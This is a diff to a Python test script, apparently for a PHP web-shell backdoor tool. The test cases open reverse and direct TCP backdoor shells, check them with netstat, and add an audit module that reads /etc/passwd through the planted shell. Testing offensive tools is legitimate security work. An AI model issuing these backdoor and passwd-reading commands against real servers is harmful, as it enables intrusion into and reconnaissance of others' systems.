@@ -148,12 +148,15 @@ TS = [
         [
         TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
         TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
-        TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port), printout=True) # check with netstat
-        
+        TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port)) # check with netstat
+        ]),
+
+      TG('Audit etc_passwd',
+        [
+        TC([ urlpwd, ':audit.etc_passwd vector=posix_getpwuid' ], ':daemon:/usr/sbin:'), 
+        TC([ urlpwd, ':audit.etc_passwd filter=True vector=fileread' ], ':daemon:/usr/sbin:', negate=True) 
         ])
-            
-      ] 
-       
+      ]       
     
 for script_path in scripts:
     fscript = file(script_path,'w')
@@ -162,7 +165,7 @@ for script_path in scripts:
     print '[+] Created "%s"' % script_path
        
 try:
-    for tg in TS:       
+    for tg in TS[7]:       
         tg.test()
 except TestException, e:
     print '[!] %s' % str(e)
